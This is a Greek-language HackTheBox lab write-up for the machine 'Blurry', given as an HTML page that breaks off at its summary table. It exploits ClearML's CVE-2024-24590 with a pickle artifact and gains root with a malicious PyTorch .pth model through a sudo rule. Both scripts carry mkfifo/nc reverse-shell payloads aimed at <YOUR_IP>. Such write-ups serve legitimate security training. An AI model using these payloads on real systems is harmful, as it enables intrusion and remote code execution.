@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Blurry &#8212; S. Markakis</title>
+<meta name="description" content="Walkthrough του μηχανήματος HackTheBox Blurry — πλήρες writeup με screenshots.">
+<meta property="og:title" content="HTB: Blurry — S. Markakis">
+<meta property="og:description" content="Walkthrough του μηχανήματος HackTheBox Blurry — πλήρες writeup με screenshots.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-blurry-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-blurry.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-blurry.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-blurry-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-blurry.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-blurry-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-blurry.html">
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* NAV */
+
+  /* WRAPPER */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  /* POST HEADER */
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb   { background: #c8d8c0; color: #2a4a28; }
+  .tag-linux { background: #d8c8b8; color: #5a3a18; }
+  .tag-med   { background: #d8e0c8; color: #2a4a10; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  /* OVERVIEW BOX */
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  /* ATTACK CHAIN */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  /* HEADINGS */
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+  strong { color: var(--text-dark); font-weight: 600; }
+  a { color: var(--text-mid); }
+
+  /* INLINE CODE */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  /* TERMINAL BLOCK */
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* prompt colors */
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  /* ALERT BOXES */
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);   color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green);  color: #1a3a20; }
+
+  /* TABLE */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  /* FOOTER */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  /* BACK LINK */
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+
+  /* SCREENSHOTS */
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem auto;
+    display: block;
+  }
+  .screenshot-caption {
+    font-size: 0.78rem;
+    color: var(--text);
+    text-align: center;
+    margin-top: -.8rem;
+    margin-bottom: 1.4rem;
+    font-style: italic;
+  }
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Blurry",
+  "description": "Walkthrough του μηχανήματος HackTheBox Blurry — πλήρες writeup με screenshots.",
+  "datePublished": "2026-04-11",
+  "dateModified": "2026-04-11",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-blurry-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-blurry.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-blurry"
+  },
+  "timeRequired": "PT5M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">&#8592; Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-blurry.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-blurry/img-01-6d378e98d0.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-blurry/img-01-6d378e98d0.png" alt="Blurry has been Pwned" width="720" height="303"></picture>
+
+  <div class="post-header">
+    <h1>HTB: Blurry</h1>
+    <div class="post-meta">
+      <span class="date">14 Ιουνίου 2024</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-linux">Linux</span>
+      <span class="tag tag-med">Μέτριο</span>
+      <span class="tag">CVE-2024-24590</span>
+      <span class="tag">ClearML</span>
+      <span class="tag">PyTorch</span>
+      <span style="color:var(--text);font-size:0.85rem;">10 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το Blurry ξεκινά με καταμέτρηση subdomains που αποκαλύπτει μια πλατφόρμα MLOps <strong>ClearML</strong> στο <code>app.blurry.htb</code>. Μετά την εγγραφή και τη ρύθμιση του SDK, εκμεταλλευόμαστε το <strong>CVE-2024-24590</strong> (unsafe pickle deserialization στο φόρτωμα artifact) για ένα foothold σαν <code>jippity</code>. Το root επιτυγχάνεται φτιάχνοντας ένα κακόβουλο <strong>μοντέλο PyTorch</strong> (<code>.pth</code>) που εκμεταλλεύεται έναν λάθος ρυθμισμένο κανόνα <code>sudo</code> — το <code>evaluate_model</code> καλεί <code>torch.load()</code>, πυροδοτώντας ένα δεύτερο deserialization σαν root.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">nmap &#8594; 22, 80</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">Gobuster DNS &#8594; 3 vhosts</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">ClearML register</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">CVE-2024-24590</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">jippity</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">sudo .pth &#8594; root</span>
+  </div>
+
+  <!-- ═══════════════════════════════════════════ RECON -->
+  <h2>Αναγνώριση</h2>
+
+  <h3>Nmap</h3>
+  <p>Το αρχικό scan βρίσκει SSH και έναν web server nginx που ανακατευθύνει αμέσως στο <code>app.blurry.htb</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">nmap &#8212; initial scan</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/blurry</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">nmap -sV -sC -oN nmap.txt 10.10.11.19</span>
+<span class="po">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://app.blurry.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">hosts &#8212; add entries</span></div>
+    <div class="term-body"><span class="pc">echo "10.10.11.19 app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb blurry.htb" | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <h3>Καταμέτρηση Subdomains</h3>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">gobuster dns</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/blurry</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">gobuster dns -d "blurry.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span>
+<span class="pg">Found: files.blurry.htb</span>
+<span class="pg">Found: app.blurry.htb</span>
+<span class="pg">Found: chat.blurry.htb</span></div>
+  </div>
+
+  <h3>chat.blurry.htb &#8212; Rocket.Chat</h3>
+  <p>Η περιήγηση στο instance Rocket.Chat μετά την εγγραφή αποκαλύπτει συζητήσεις της ομάδας.
+  <picture data-img-optimized="1"><source srcset="assets/htb-blurry/img-02-ee8bea5b9e.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-blurry/img-02-ee8bea5b9e.png" alt="Rocket.Chat — jippity identified as admin" width="720" height="216"></picture> Ο χρήστης admin είναι ο <strong>jippity</strong> και η ομάδα χτίζει AI tooling &#8212; χρήσιμο context για το τι τρέχει στο <code>app.blurry.htb</code>.</p>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-blurry/img-03-8624da4ad7.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-blurry/img-03-8624da4ad7.png" alt="chat.blurry.htb — Rocket.Chat login" width="720" height="263"></picture>
+
+  <h3>app.blurry.htb &#8212; ClearML</h3>
+  <picture data-img-optimized="1"><source srcset="assets/htb-blurry/img-04-cda9bda008.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-blurry/img-04-cda9bda008.png" alt="app.blurry.htb — ClearML registration" width="575" height="354"></picture>
+
+  <p>Το <strong>ClearML</strong> είναι μια πλατφόρμα MLOps ανοιχτού κώδικα για tracking πειραμάτων AI/ML. Η υποβολή οποιουδήποτε ονόματος δίνει πρόσβαση developer και παρέχει credentials API. Χρειάζεται να προσθέσουμε το <code>api.blurry.htb</code> στο hosts πριν τρέξουμε το SDK init.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">clearml &#8212; setup</span></div>
+    <div class="term-body"><span class="pc">pip install virtualenv && python3 -m venv .env && source .env/bin/activate</span>
+<span class="pc">pip install clearml</span>
+<span class="pc">clearml-init</span>
+<span class="pco"># paste the config from the web UI settings page when prompted</span></div>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-blurry/img-05-ca7a1e1fff.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-blurry/img-05-ca7a1e1fff.png" alt="ClearML — SDK setup instructions" width="648" height="716"></picture>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">~/.clearml.conf</span></div>
+    <div class="term-body"><span class="po">api {
+  web_server:   http://app.blurry.htb
+  api_server:   http://api.blurry.htb
+  files_server: http://files.blurry.htb
+  credentials {
+    "access_key" = "TCD21QWKRNXVRMH39C8C"
+    "secret_key" = "n5cLnoNaOhJuvixJeG6Gy1Slt5wICU5tHbJHuSi8mTnvD0S"
+  }
+}</span></div>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-blurry/img-06-c1b1e85358.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-blurry/img-06-c1b1e85358.png" alt="clearml-init — credentials verified" width="720" height="594"></picture>
+
+  <!-- ═══════════════════════════════════════════ VULNS -->
+  <h2>Ευπάθειες</h2>
+
+  <p>Η αναζήτηση για γνωστά CVEs του ClearML αναδεικνύει μια δέσμη disclosures από τις αρχές του 2024. Αυτό που έχει σημασία για εμάς:</p>
+
+  <table>
+    <tr><th>CVE</th><th>Περιγραφη</th><th>Χρησιμοποιηθηκε</th></tr>
+    <tr><td><strong>CVE-2024-24590</strong></td><td>Pickle Load στο Artifact Get &#8212; unsafe deserialization</td><td><span class="pg">&#10003; foothold</span></td></tr>
+    <tr><td>CVE-2024-24591</td><td>Path Traversal στο File Download</td><td>&#8212;</td></tr>
+    <tr><td>CVE-2024-24592</td><td>Improper Auth &#8594; Arbitrary Read-Write</td><td>&#8212;</td></tr>
+    <tr><td>CVE-2024-24593</td><td>CSRF στον ClearML Server</td><td>&#8212;</td></tr>
+    <tr><td>CVE-2024-24594</td><td>XSS μέσω HTML rendering</td><td>&#8212;</td></tr>
+    <tr><td>CVE-2024-24595</td><td>Plaintext creds στη MongoDB</td><td>&#8212;</td></tr>
+  </table>
+
+  <p>Όταν ένας agent ClearML επεξεργάζεται ένα task, κατεβάζει το artifact και καλεί <code>pickle.load()</code> χωρίς validation. Φτιάχνοντας ένα αντικείμενο με κακόβουλη μέθοδο <code>__reduce__</code>, εκτελούμε αυθαίρετο κώδικα τη στιγμή που ο agent πιάνει το task μας.</p>
+
+  <!-- ═══════════════════════════════════════════ FOOTHOLD -->
+  <h2>Foothold</h2>
+
+  <h3>CVE-2024-24590 &#8212; Pickle Deserialization</h3>
+  <p>Δημιουργούμε μια κλάση της οποίας το <code>__reduce__</code> επιστρέφει μια εντολή reverse shell, την ανεβάζουμε σαν artifact ClearML με tag <code>review</code>, και την βάζουμε σε queue. Ο agent admin την εκτελεί αυτόματα.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">exploit.py</span></div>
+    <div class="term-body"><span class="pb">import</span> os, subprocess
+<span class="pb">from</span> clearml <span class="pb">import</span> Task
+
+<span class="pb">class</span> <span class="py">ShellExecutor</span>:
+    <span class="pb">def</span> <span class="pg">__reduce__</span>(self):
+        cmd = <span class="po">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc &lt;YOUR_IP&gt; 4444 &gt;/tmp/f"</span>
+        <span class="pb">return</span> (subprocess.call, (cmd,))
+
+task = Task.init(
+    project_name=<span class="po">"Black Swan"</span>,
+    task_name=<span class="po">"sp1r4Task"</span>,
+    tags=[<span class="po">"review"</span>],
+    task_type=Task.TaskTypes.data_processing,
+    output_uri=<span class="pb">True</span>
+)
+task.upload_artifact(name=<span class="po">"sp1r4Artifact"</span>, artifact_object=<span class="py">ShellExecutor</span>(), retries=2, wait_on_upload=<span class="pb">True</span>)
+task.execute_remotely(queue_name=<span class="po">'default'</span>)</div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">listener &amp; shell stabilization</span></div>
+    <div class="term-body"><span class="pco"># Ξεκίνα listener πριν τρέξεις το exploit</span>
+<span class="pc">nc -lvnp 4444</span>
+
+<span class="pco"># Μόλις συνδεθείς &#8212; σταθεροποίησε</span>
+<span class="pc">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="pc">export TERM=xterm</span>
+<span class="pco"># Ctrl+Z</span>
+<span class="pc">stty raw -echo; fg</span>
+<span class="pg">jippity@blurry:~$</span></div>
+  </div>
+
+  <div class="alert alert-success">&#128681; Shell σαν <strong>jippity</strong>. User flag πιάστηκε.</div>
+
+  <!-- ═══════════════════════════════════════════ PRIVESC -->
+  <h2>Privilege Escalation</h2>
+
+  <h3>sudo -l</h3>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">sudo permissions</span></div>
+    <div class="term-body"><span class="pg">jippity@blurry</span><span class="ps">:~$ </span><span class="pc">sudo -l</span>
+<span class="po">User jippity may run the following commands on blurry:
+    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth</span></div>
+  </div>
+
+  <p>Το script <code>evaluate_model</code> φορτώνει αρχεία μοντέλου με <code>torch.load()</code> &#8212; που εσωτερικά καλεί <code>pickle.load()</code>. Έχουμε επίσης πρόσβαση εγγραφής στο <code>/models/</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">check /models permissions</span></div>
+    <div class="term-body"><span class="pg">jippity@blurry</span><span class="ps">:~$ </span><span class="pc">ls -la / | grep models</span>
+<span class="po">drwxrwxr-x  2 root jippity 4096 Jun 13 13:32 models</span></div>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-blurry/img-07-c830eb0b31.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-blurry/img-07-c830eb0b31.png" alt="/models — writable by jippity" width="671" height="37"></picture>
+
+  <div class="alert alert-info">&#9432; <strong>torch.load() == pickle.load()</strong> &mdash; τα αρχεία <code>.pth</code> του PyTorch είναι pickle-serialized αντικείμενα. Κάθε κλάση με προσαρμοσμένο <code>__reduce__</code> θα εκτελέσει αυθαίρετο κώδικα στο φόρτωμα.</div>
+
+  <h3>Κακόβουλο Μοντέλο PyTorch</h3>
+  <p>Φτιάχνουμε μια κλάση μοντέλου που παρακάμπτει το <code>__reduce__</code> με ένα reverse shell, το αποθηκεύουμε σαν αρχείο <code>.pth</code>, και το ρίχνουμε στο <code>/models/</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">malicious_model.py</span></div>
+    <div class="term-body"><span class="pb">import</span> torch, torch.nn <span class="pb">as</span> nn, os
+
+<span class="pb">class</span> <span class="py">MaliciousModel</span>(nn.Module):
+    <span class="pb">def</span> <span class="pg">__init__</span>(self):
+        super().__init__()
+        self.dense = nn.Linear(10, 1)
+
+    <span class="pb">def</span> <span class="pg">forward</span>(self, x):
+        <span class="pb">return</span> self.dense(x)
+
+    <span class="pb">def</span> <span class="pg">__reduce__</span>(self):
+        cmd = <span class="po">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc &lt;YOUR_IP&gt; 9001 &gt;/tmp/f"</span>
+        <span class="pb">return</span> os.system, (cmd,)
+
+torch.save(<span class="py">MaliciousModel</span>(), <span class="po">'sp1r4_model.pth'</span>)</div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">deliver &amp; trigger</span></div>
+    <div class="term-body"><span class="pco"># Επιτιθέμενος &#8212; σερβίρε το αρχείο</span>
+<span class="pc">python3 -m http.server 8080</span>
+
+<span class="pco"># Στόχος &#8212; τράβηξε και βάλε το</span>
+<span class="pg">jippity@blurry</span><span class="ps">:~$ </span><span class="pc">wget http://&lt;YOUR_IP&gt;:8080/sp1r4_model.pth -O /models/sp1r4_model.pth</span>
+
+<span class="pco"># Ξεκίνα δεύτερο listener, μετά πυροδότησε σαν root</span>
+<span class="pc">nc -lvnp 9001</span>
+<span class="pg">jippity@blurry</span><span class="ps">:/models$ </span><span class="pc">sudo /usr/bin/evaluate_model /models/sp1r4_model.pth</span>
+<span class="po">[+] Model /models/sp1r4_model.pth is considered safe. Processing...</span>
+
+<span class="pco"># Λαβαμε shell:</span>
+<span class="pg"># whoami</span>
+<span class="po">root</span>
+<span class="pg"># cat /root/root.txt</span>
+<span class="py">HTB{...}</span></div>
+  </div>
+
+  <div class="alert alert-success">&#128681; Root flag πιάστηκε. Το μηχάνημα pwned.</div>
+
+  <!-- ═══════════════════════════════════════════ SUMMARY -->
+  <h2>Περίληψη</h2>
+  <table class="st">
